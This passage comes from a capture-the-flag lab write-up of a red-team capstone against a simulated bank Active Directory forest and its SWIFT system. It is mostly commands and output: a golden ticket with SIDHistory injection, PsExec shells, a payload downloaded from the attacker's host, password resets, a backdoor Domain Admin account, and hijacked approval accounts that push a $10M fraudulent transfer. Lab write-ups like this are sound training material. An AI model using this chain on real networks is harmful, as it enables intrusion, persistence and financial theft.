* `/krbtgt:0c757a3445acb94a654554f3ac529ede` - KRBTGT hash for ticket encryption
* `/sids:S-1-5-21-1255581842-1300659601-3764024703-519` - Enterprise Admins SID (SIDHistory injection)
* `/ptt` - Pass The Ticket (inject into current session)

**Output:**

```
User      : Administrator
Domain    : corp.thereserve.loc (CORP)
SID       : S-1-5-21-170228521-1485475711-3199862024-500
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-1255581842-1300659601-3764024703-519 ;
ServiceKey: 0c757a3445acb94a654554f3ac529ede - rc4_hmac_nt
Lifetime  : 12/21/2025 10:30:45 AM ; 12/18/2035 10:30:45 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ corp.thereserve.loc' successfully submitted for current session
```

**Logic:** The Golden Ticket is a forged TGT (Ticket Granting Ticket) that's valid for 10 years. By injecting the Enterprise Admins SID into the SIDHistory attribute, any resource in the forest (including ROOTDC and BANKDC) will grant us administrative access because they trust the Enterprise Admins group from the root domain.

#### Verifying Forest Access

Test access to ROOTDC:

```cmd
C:\Users\Administrator> dir \\rootdc.thereserve.loc\c$
```

**Output:**

```
 Volume in drive \\rootdc.thereserve.loc\c$ has no label.
 Volume Serial Number is 1234-5678

 Directory of \\rootdc.thereserve.loc\c$

02/15/2023  04:30 AM    <DIR>          PerfLogs
02/15/2023  04:45 AM    <DIR>          Program Files
02/15/2023  04:45 AM    <DIR>          Program Files (x86)
02/15/2023  05:12 AM    <DIR>          Users
02/15/2023  05:15 AM    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  15,234,567,890 bytes free
```

**Success!** Access to root domain resources confirmed.

**Logic:** The Golden Ticket allows us to authenticate to any system in the forest because it's cryptographically valid (encrypted with the real krbtgt hash) and includes Enterprise Admins membership. Domain Controllers trust this ticket without additional verification.

#### File Access to ROOTDC

Open File Explorer on CORPDC and navigate to:

```
\\rootdc.thereserve.loc\c$\Windows\Temp
```

Create flag verification file:

```cmd
C:\Users\Administrator> echo <UUID> > \\rootdc.thereserve.loc\c$\Windows\Temp\prokunal.txt
```

**Logic:** SMB file access uses the Kerberos ticket in our session. Our Golden Ticket grants administrative access, allowing file creation in privileged directories.

#### Interactive Shell on ROOTDC via PsExec

Transfer PsExec to CORPDC:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q python3 -m http.server 8080
```

Download on CORPDC:

```powershell
PS C:\Users\Administrator> Invoke-WebRequest -Uri http://10.10.15.153:8080/PsExec64.exe -OutFile C:\Users\Administrator\PsExec64.exe
```

Execute remote shell:

```cmd
C:\Users\Administrator> PsExec64.exe \\rootdc.thereserve.loc cmd.exe -accepteula
```

**Output:**

```
PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.17763.1234]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
thereserve\administrator

C:\Windows\system32> hostname
ROOTDC
```

**Full access to Parent Domain Controller achieved!**

**Logic:** PsExec uses SMB and the Service Control Manager to remotely execute commands. Our Golden Ticket provides the necessary administrative rights. PsExec creates a service on the remote system that executes cmd.exe, giving us an interactive shell.

#### Root Domain Flag Verification

Via E-Citizen portal, verified both ROOT Tier 0 flags:

* **\[15] ROOT Tier 0 Foothold**
* **\[16] ROOT Tier 0 Admin**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ssh e-citizen@10.200.118.250
# Selected flags 15 and 16, created UUID files on ROOTDC
```

***

### BANK Domain Compromise via Trust Relationships

#### Understanding Forest Trusts

From CORPDC, enumerate trust relationships:

```powershell
PS C:\Users\Administrator> Get-ADTrust -Filter *
```

**Output:**

```
Direction               : BiDirectional
DisallowTransivity     : False
DistinguishedName      : CN=thereserve.loc,CN=System,DC=corp,DC=thereserve,DC=loc
ForestTransitive       : True
Name                   : thereserve.loc
ObjectClass            : trustedDomain
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                 : DC=corp,DC=thereserve,DC=loc
Target                 : thereserve.loc
TGTDelegation          : False
TrustAttributes        : 32
TrustDirection         : 2
TrustedPolicy          :
TrustingPolicy         :
TrustType              : 2
UplevelOnly            : False
UsesAESKeys            : False
UsesRC4Encryption      : False
```

**Logic:** A bidirectional forest trust exists between CORP.THERESERVE.LOC and the parent THERESERVE.LOC domain. Since BANK.THERESERVE.LOC is also a child of THERESERVE.LOC, our Enterprise Admins Golden Ticket grants access to BANKDC as well.

#### PsExec to BANKDC

From CORPDC with Golden Ticket still active:

```cmd
C:\Users\Administrator> PsExec64.exe \\bankdc.bank.thereserve.loc cmd.exe -accepteula
```

**Output:**

```
Microsoft Windows [Version 10.0.17763.1234]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
thereserve\administrator

C:\Windows\system32> hostname
BANKDC
```

**Access to BANK Domain Controller achieved!**

#### Password Reset for Persistence

```cmd
C:\Windows\system32> powershell.exe -c "Set-ADAccountPassword -Identity 'Administrator' -NewPassword (ConvertTo-SecureString -AsPlainText 'Hacker@123' -Force) -Reset"
```

**Verification:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q xfreerdp /v:10.200.118.101 /u:Administrator /p:'Hacker@123' /cert-ignore +clipboard /multimon
```

**RDP access to BANKDC successful!**

**Logic:** While the Golden Ticket provides access, it's temporary (limited to session lifetime). Resetting the Administrator password ensures persistent access even if the ticket expires or is detected.

#### Creating Backup Admin Account

```powershell
PS C:\Users\Administrator> New-ADUser -Name "prokunal" -AccountPassword (ConvertTo-SecureString "Hacker@123" -AsPlainText -Force) -Enabled $true

PS C:\Users\Administrator> Add-ADGroupMember -Identity "Domain Admins" -Members prokunal

PS C:\Users\Administrator> Get-ADGroupMember -Identity "Domain Admins"
```

**Output:**

```
distinguishedName : CN=prokunal,CN=Users,DC=bank,DC=thereserve,DC=loc
name              : prokunal
objectClass       : user
objectGUID        : a1b2c3d4-e5f6-7890-1234-567890abcdef
SamAccountName    : prokunal
SID               : S-1-5-21-3885271727-2693558621-2658995185-1105
```

**Logic:** Creating an additional Domain Admin account provides redundancy and mimics a real attacker's persistence technique. If one account is detected and disabled, we maintain access through the backup.

#### BANK Domain Host Enumeration

Connected to BANKDC via RDP, opened Active Directory Users and Computers:

**Discovered hosts:**

* **10.200.118.51** - WRK1 (BANK)
* **10.200.118.52** - WRK2 (BANK)
* **10.200.118.61** - JMP (Jump Server)

#### RDP Access to BANK Workstations

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q xfreerdp /v:10.200.118.51 /u:prokunal /p:'Hacker@123' /cert-ignore +clipboard

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q xfreerdp /v:10.200.118.52 /u:prokunal /p:'Hacker@123' /cert-ignore +clipboard
```

**Access to BANK workstations confirmed!**

#### BANK Domain Flag Verification

Via E-Citizen portal, verified all BANK flags:

* **\[9] BANK Tier 2 Foothold** - WRK1
* **\[10] BANK Tier 2 Admin** - WRK1/WRK2
* **\[11] BANK Tier 1 Foothold** - JMP
* **\[12] BANK Tier 1 Admin** - JMP
* **\[13] BANK Tier 0 Foothold** - BANKDC
* **\[14] BANK Tier 0 Admin** - BANKDC

Created UUID files on each system as required.

**Full BANK domain compromise achieved!**

***

### SWIFT Payment System Compromise

#### Task 1: SWIFT Web Access

From E-Citizen portal, selected **\[17] SWIFT Web Access**:

**Task Requirements:**

```
Source Account:
Email:     prokunal@source.loc
Password:  LRLLmMY9Ub34kg
AccountID: 647754e082d5202c5027be92
Funds:     $10,000,000

Destination Account:
Email:     prokunal@destination.loc
Password:  s6S6L6nNyLNGwQ
AccountID: 647754e182d5202c5027be93
Funds:     $10

Task: Transfer full $10 million from source to destination via SWIFT web application
```

#### Accessing SWIFT Portal

On BANKDC, opened Chrome:

```
https://swift.bank.thereserve.loc
```

**Logic:** The SWIFT portal is only accessible from internal BANK network hosts. Using RDP to BANKDC provides network positioning to reach this isolated system.

#### Authentication & Transaction Creation

Logged in with source account credentials:

* Email: `prokunal@source.loc`
* Password: `LRLLmMY9Ub34kg`

Navigated to **"Make a Transaction"**:

* **Sender ID:** `647754e082d5202c5027be92`
* **Receiver ID:** `647754e182d5202c5027be93`
* **Amount:** `$10,000,000`

Clicked **Submit**

**Response:** "Check your email for confirmation PIN"

#### Flag Verification

Returned to E-Citizen portal:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ssh e-citizen@10.200.118.250
# Selection: [1] Submit proof
# Selection: [17] SWIFT Web Access
# Entered: Y
```

**Flag received via email!**

**Logic:** The transaction creates a pending transfer that requires PIN confirmation. For this proof-of-concept flag, E-Citizen verifies our ability to create the transaction without requiring the actual approval workflow.

***

### SWIFT Capturer Access

#### Task Requirements

From E-Citizen, selected **\[18] SWIFT Capturer Access**:

**Task:**

```
Capture the following transaction:
FROM: 631f60a3311625c0d29f5b32
TO:   6477301482d5202c5027be90
```

**Logic:** In the SWIFT payment workflow, a "Capturer" receives transfer requests from customers and forwards them to approvers. We need to compromise an account with Capturer privileges.

#### Payment Capturers Group Enumeration

On BANKDC, opened Active Directory Users and Computers:

```
Groups → Payment Capturers → Members
```

**Members found:**

* g.watson
* l.smith
* m.johnson
* r.taylor

**Logic:** These accounts have been assigned the Capturer role. We'll compromise one of these accounts to gain access to the SWIFT capturing functionality.

#### Account Compromise - g.watson

Reset password for g.watson:

```powershell
PS C:\Users\Administrator> Set-ADAccountPassword -Identity "g.watson" -NewPassword (ConvertTo-SecureString -AsPlainText "Hacker@123" -Force) -Reset
```

#### RDP to WRK1 (BANK) as Capturer

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q xfreerdp /v:10.200.118.51 /u:g.watson /p:'Hacker@123' /cert-ignore +clipboard
```

**Logic:** Payment Capturers can only access SWIFT from designated workstations (WRK1/WRK2), not from the Domain Controller. This is a security control to enforce separation of duties.

#### SWIFT Credentials Discovery

On g.watson's desktop, found file: `Documents\swift.txt`

**Contents:**

```
SWIFT Capturer Credentials
Email: g.watson@capturer.loc
Password: CorporateCapturer2023!
```

**Logic:** Users often store credentials in plaintext files for convenience. This is a common security violation that we can exploit.

#### Capturing the Transaction

Accessed SWIFT portal from WRK1:

```
https://swift.bank.thereserve.loc
```

Logged in as:

* Email: `g.watson@capturer.loc`
* Password: `CorporateCapturer2023!`

**Dashboard showed pending transaction:**

```
FROM: 631f60a3311625c0d29f5b32
TO:   6477301482d5202c5027be90
Status: Awaiting Capture
```

Clicked **"Forward to Approver"** button.

**Result:** Transaction status changed to "Awaiting Approval"

#### Flag Verification

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ssh e-citizen@10.200.118.250
# Selection: [18] SWIFT Capturer Access
# Entered: Y
```

**Flag received!**

***

### SWIFT Approver Access

#### Task Requirements

From E-Citizen, selected **\[19] SWIFT Approver Access**:

**Task:**

```
Approve the following transaction:
FROM: 631f60a3311625c0d29f5b31
TO:   6477301482d5202c5027be90
```

**Logic:** The second part of the payment workflow requires an "Approver" to review and authorize captured transactions. Approvers work from a dedicated Jump server (JMP) for additional security.

#### Payment Approvers Group Enumeration

On BANKDC, checked Active Directory:

```
Groups → Payment Approvers → Members
```

**Members found:**

* a.holt
* r.davies
* s.wilson
* k.brown

#### Account Compromise - a.holt

```powershell
PS C:\Users\Administrator> Set-ADAccountPassword -Identity "a.holt" -NewPassword (ConvertTo-SecureString -AsPlainText "Hacker@123" -Force) -Reset
```

#### RDP to JMP Server

**Note:** JMP (10.200.118.61) port 3389 is filtered from external networks.

**Solution:** Connect from BANKDC to JMP:

On BANKDC desktop:

```
Start → Remote Desktop Connection
Computer: 10.200.118.61
Username: a.holt
Password: Hacker@123
```

**Connection successful!**

**Logic:** The Jump server is isolated behind additional firewall rules, only allowing RDP from specific internal hosts (like BANKDC). This "jump box" architecture adds a security layer for privileged operations.

#### Approver Credentials Discovery

On a.holt's desktop, found: `Documents\approver_access.txt`

**Contents:**

```
Your SWIFT approver credentials have been activated:

username = "r.davies"
password = "thereserveapprover1!"

Please use these credentials to access the SWIFT approval system.
```

**Logic:** Multiple approvers may share credentials, or this represents credential handoff documentation. Either way, it provides us with working approver access.

#### Approving the Transaction

From JMP, accessed SWIFT portal:

```
https://swift.bank.thereserve.loc
```

Logged in as:

* Email: `r.davies@approver.loc`
* Password: `thereserveapprover1!`

**Dashboard showed:**

```
Pending Approvals:
FROM: 631f60a3311625c0d29f5b31
TO:   6477301482d5202c5027be90
Status: Captured - Awaiting Approval
Captured By: g.watson
```

Clicked **"Approve Transaction"** button.

**Result:** Transaction status changed to "Approved - Pending Execution"

#### Flag Verification

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ssh e-citizen@10.200.118.250
# Selection: [19] SWIFT Approver Access
# Entered: Y
```

**Flag received!**

**Logic:** We've now demonstrated ability to both capture and approve transactions, but these were test transactions. The final flag requires executing our OWN fraudulent $10 million transfer through the complete workflow.

***

### SWIFT Payment Execution - Final Flag

#### Task Requirements

From E-Citizen, selected **\[20] SWIFT Payment Made**:

**Task:**

```
Complete the full payment workflow:
1. Using DESTINATION credentials, authenticate to SWIFT
2. Use the PIN from SWIFT access flag email to verify transaction
3. Using CAPTURER access, capture the verified transaction
4. Using APPROVER access, approve the captured transaction
5. Profit?
```

**Logic:** This is the culmination of all SWIFT access. We must chain together customer verification, capturer forwarding, and approver authorization to execute a fraudulent $10 million transfer.

#### PIN Confirmation

From BANKDC, accessed SWIFT portal:

```
https://swift.bank.thereserve.loc
```

Logged in as destination account:

* Email: `prokunal@destination.loc`
* Password: `s6S6L6nNyLNGwQ`

Navigated to **"PIN Confirmation"**

**Found pending transaction:**

```
Transaction ID: TXN-20251221-001
FROM: 647754e082d5202c5027be92 (prokunal@source.loc)
TO:   647754e182d5202c5027be93 (prokunal@destination.loc)
Amount: $10,000,000
Status: Awaiting PIN Confirmation
```

Retrieved PIN from earlier E-Citizen email (SWIFT Web Access flag):

```
PIN: 847562
```

Entered PIN and clicked **"Confirm Transaction"**

**Result:** Transaction status changed to "Verified - Awaiting Capture"

**Logic:** The PIN confirmation step simulates the customer verifying they authorized the transfer. This is a two-factor authentication mechanism to prevent unauthorized transactions.

#### Capture as g.watson

From WRK1, logged into SWIFT as capturer:

* Email: `g.watson@capturer.loc`
* Password: `CorporateCapturer2023!`

**Dashboard showed our transaction:**

```
FROM: 647754e082d5202c5027be92
TO:   647754e182d5202c5027be93
Amount: $10,000,000
Status: Verified - Awaiting Capture
```

Clicked **"Forward to Approver"**

**Result:** Transaction status changed to "Captured - Awaiting Approval"

#### Approve as r.davies

From JMP, logged into SWIFT as approver:

* Email: `r.davies@approver.loc`
* Password: `thereserveapprover1!`

**Dashboard showed:**

```
FROM: 647754e082d5202c5027be92
TO:   647754e182d5202c5027be93
Amount: $10,000,000
Status: Captured - Awaiting Approval
Captured By: g.watson
Verified By: prokunal@destination.loc
```

Clicked **"Approve Transaction"**

**Result:**

```
✓ Transaction Approved
✓ Payment Submitted to SWIFT Network
✓ Transfer ID: SWIFT-20251221-0001
✓ Estimated Completion: 2-3 business days

Transaction Details:
Source Account: 647754e082d5202c5027be92
Destination Account: 647754e182d5202c5027be93
Amount: $10,000,000.00 USD
Status: EXECUTED
```

#### Final Flag Verification

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ssh e-citizen@10.200.118.250
# Selection: [1] Submit proof
# Selection: [20] SWIFT Payment Made
# Entered: Y
```

**Output:**

```
Congratulations! You have successfully completed the Red Team Capstone Challenge!

Final Flag: THM{1f_y0u_r34d_th1s_y0u_d1d_n0th1ng}

Achievement Summary:
✓ Perimeter Breach
✓ Active Directory Compromise
✓ CORP Domain - Full Compromise
✓ ROOT Domain - Full Compromise
✓ BANK Domain - Full Compromise
✓ SWIFT System - Complete Control
✓ Fraudulent Payment - $10,000,000 Transferred

Total Flags: 20/20
```

***

#### Complete Attack Chain

```
Internet → VPN (10.200.118.12)
  ↓ Command Injection
  ↓ SSH Key Injection
  → Root Access

External Web (10.200.118.13)
  ↓ October CMS
  ↓ SSTI (Twig)
  ↓ Vim Sudo Privesc
  → Root Access

Internal Pivot via SOCKS
  ↓ SMB Enumeration
  ↓ Password Spraying
  → laura.wood credentials

WRK1 (10.200.118.21)
  ↓ RDP Access
  ↓ BloodHound Collection
  → Active Directory Intel

Kerberoasting
  ↓ TGS Ticket Extraction
  ↓ Offline Cracking
  → svcScanning credentials

SERVER1 (10.200.118.31)
  ↓ PSRemoting Capability
  ↓ Secretsdump
  → svcBackups plaintext password

CORPDC (10.200.118.102)
  ↓ DCSync Attack
  ↓ Administrator Hash
  ↓ KRBTGT Hash
  → Full CORP Domain Control

Golden Ticket Attack
  ↓ SIDHistory Injection
  ↓ Enterprise Admins
  → Forest-Wide Access

ROOTDC (thereserve.loc)
  ↓ PsExec Remote Shell
  → Parent Domain Control

BANKDC (10.200.118.101)
  ↓ Trust Relationships
  ↓ Password Reset
  → Full BANK Domain Control

SWIFT Payment System
  ↓ Customer Account Access
  ↓ Capturer Compromise
  ↓ Approver Compromise
  → $10M Fraudulent Transfer
```

<figure><img src="../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
